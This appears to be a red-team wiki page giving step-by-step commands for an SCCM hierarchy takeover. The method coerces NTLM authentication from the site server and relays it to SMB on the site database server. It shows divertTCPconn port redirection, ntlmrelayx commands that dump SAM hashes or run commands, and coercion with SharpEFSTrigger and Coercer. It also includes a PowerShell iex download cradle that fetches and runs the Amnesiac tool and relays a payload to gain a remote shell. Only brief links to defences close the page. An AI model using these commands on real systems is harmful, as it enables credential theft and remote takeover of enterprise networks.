# TAKEOVER-2

## Document Reference

* [TAKEOVER-2](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-2/takeover-2\_description.md)

## Description

Hierarchy takeover via NTLM coercion and relay to SMB on remote site database

## Requirements

* PKI certificates are not required for client authentication (default)
* SCCM database server hosted on a system that is independent of the main site server
* SMB is reachable and SMB signing isn’t required on the site database server
* Local Administrator if performing the attack from Windows (due to SMB port redirect)

## Tools Required

* divertTCPConn: [https://github.com/Arno0x/DivertTCPconn](https://github.com/Arno0x/DivertTCPconn)
* Coercion Tools: [https://github.com/The-Viper-One/RedTeam-Pentest-Tools/tree/main/Coercion](https://github.com/The-Viper-One/RedTeam-Pentest-Tools/tree/main/Coercion)
* ntlmrelayx: [https://github.com/The-Viper-One/RedTeam-Pentest-Tools/blob/main/Relay/ntlmrelayx.exe](https://github.com/The-Viper-One/RedTeam-Pentest-Tools/blob/main/Relay/ntlmrelayx.exe)

## Windows

Divert SMB on port 445 to port 8445 (Requires Local Administrator)

```
divertTCPconn.exe 445 8445
```

Set up ntlmrelayx to the alternate SMB port and to point at the MSSQL database server

```
# Dump SAM
ntlmrelayx.exe --smb-port 8445 -smb2support -t <MSSQL SSCM IP>

# Execute Commands
ntlmrelayx.exe --smb-port 8445 -smb2support -t 192.168.60.12 -c "[Command]"
```

Perform the coercerian with SharpEFSTrigger to relay the SCCM Site Server computer account to the MSSQL database server.

{% code overflow="wrap" %}
```powershell
# Option 2: SharpEFSTrigger
SharpEFSTrigger.exe <Site Server IP> <Listener IP> EfsRpcDecryptFileSrv

# Option 1: Coercer
Coercer.exe coerce -u [Username] -p "[Password]" -d [Domain] -t [Site Server IP] -l [Listener IP] --auth-type smb --filter-method-name EfsRpcDecryptFileSrv
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2146).png" alt=""><figcaption></figcaption></figure>

### Getting a full shell on Windows with Amnesiac

* Amnesiac: [https://github.com/Leo4j/Amnesiac](https://github.com/Leo4j/Amnesiac)

Load Amnesiac through PowerShell

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac
</strong></code></pre>

Generate a global listener payload with option \[2]

<figure><img src="../../../.gitbook/assets/image (2153).png" alt=""><figcaption></figcaption></figure>

Use the payload within ntlmrelayx to be executed on the target system.

```powershell
# Setup with ntlmrelayx
ntlmrelayx.exe -t 192.168.60.12 -smb2support --smb-port 8445 -c "[PAYLOAD]"
```

Once we trigger coercion again, ntlmrelayx will execute the powershell payload on the target system. Once this is done, use option \[3] on Amnesiac to connect.

<figure><img src="../../../.gitbook/assets/image (2154).png" alt=""><figcaption></figcaption></figure>

### Defensive IDs

* [DETECT-1: Monitor site server domain computer accounts authenticating from another source](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/DETECT/DETECT-1/detect-1\_description.md)
* [PREVENT-12: Require SMB signing on site systems](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-12/prevent-12\_description.md)
* [PREVENT-20: Block unnecessary connections to site systems](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-20/prevent-20\_description.md)
